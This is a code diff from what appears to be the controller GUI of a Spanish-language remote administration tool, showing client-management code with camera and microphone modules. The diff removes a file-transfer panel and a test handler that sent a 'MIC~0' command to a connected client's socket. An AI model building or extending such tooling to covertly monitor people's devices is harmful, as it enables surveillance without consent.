@@ -78,8 +78,7 @@ FrameCliente::FrameCliente(std::string strID, wxString nameID)
     this->m_tree->AppendItem(rootSurveilance, wxT("Camara"));
     
     this->m_tree->AppendItem(rootMisc, wxT("Testing"));*/
-    this->m_tree->AppendItem(rootMisc, wxT("Transferencias"));
-
+    
     this->m_tree->p_Notebook = new wxAuiNotebook(pnl_Right, wxID_ANY, wxDefaultPosition, wxSize(FRAME_CLIENT_SIZE_WIDTH, 450),
         wxAUI_NB_CLOSE_ON_ACTIVE_TAB | wxAUI_NB_DEFAULT_STYLE | wxAUI_NB_TAB_EXTERNAL_MOVE | wxNO_BORDER);
 
@@ -104,6 +103,7 @@ FrameCliente::FrameCliente(std::string strID, wxString nameID)
     SetClientSize(800, 450);
     SetSizeHints(820, 485, 820, 485);
 
+    //this->thTransferencias = std::thread(&FrameCliente::MonitorTransferencias, this);
 
 }
 
@@ -126,19 +126,7 @@ void FrameCliente::OnClosePage(wxAuiNotebookEvent& event) {
 }
 
 void FrameCliente::OnTest(wxCommandEvent& event) {
-    std::vector<struct Cliente> vc_Copy;
-    std::unique_lock<std::mutex> lock(vector_mutex);
-    //OLD METHOD
-    vc_Copy = p_Servidor->vc_Clientes;
-    lock.unlock();
-    
-    for (auto aClient : vc_Copy) {
-        if (aClient._id == this->strClienteID) {
-            int ib = p_Servidor->cSend(aClient._sckCliente, "MIC~0", 13, 0, false);
-            std::cout << "SENT " << ib << "\n";
-            break;
-        }
-    }
+    return;
 }
 
 void FrameCliente::OnClose(wxCloseEvent& event) {
@@ -156,9 +144,10 @@ void FrameCliente::OnClose(wxCloseEvent& event) {
             p_Servidor->cSend(aClient->second._sckCliente, strComando.c_str(), strComando.size(), 0, false);
         }
     }
+
     
     lock.unlock();
-
+    
     event.Skip();
 }
 
@@ -195,47 +184,12 @@ void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
             this->p_Notebook->AddPage(new panelMicrophone(this), wStr, true);
         }
 
-        if (wStr == "Transferencias") {
-            this->p_Notebook->AddPage(new panelTransferencias(this), wStr, true);
-        }
-
         this->p_Notebook->Thaw();
     } 
 }
 
 
 //-----------------Modulos-----------------//
-
-//Transferencias activas
-panelTransferencias::panelTransferencias(wxWindow* pParent) :
-    wxPanel(pParent, wxID_ANY) {
-
-    FrameCliente* temp_ctrl = (FrameCliente*)this->GetParent()->GetParent();
-    if (temp_ctrl) {
-        temp_ctrl->isEstadoTransferencia = true;
-    }
-
-    wxListCtrl* listView = new wxListCtrl(this, wxID_ANY, wxDefaultPosition, wxSize(FRAME_CLIENT_SIZE_WIDTH, 450), wxLC_REPORT | wxLC_SINGLE_SEL | wxLC_HRULES | wxLC_VRULES | wxEXPAND);
-    
-    wxListItem itemCol;
-    itemCol.SetText("Cliente");
-    itemCol.SetWidth(100);
-    itemCol.SetAlign(wxLIST_FORMAT_CENTRE);
-    listView->InsertColumn(0, itemCol);
-
-    itemCol.SetText("Nombre");
-    itemCol.SetWidth(160);
-    listView->InsertColumn(1, itemCol);
-
-    itemCol.SetText("Estado");
-    itemCol.SetWidth(120);
-    listView->InsertColumn(2, itemCol);
-
-    itemCol.SetText("Progreso");
-    itemCol.SetWidth(140);
-    listView->InsertColumn(3, itemCol);
-
-}
 
 //Test
 panelTest::panelTest(wxWindow* pParent) :
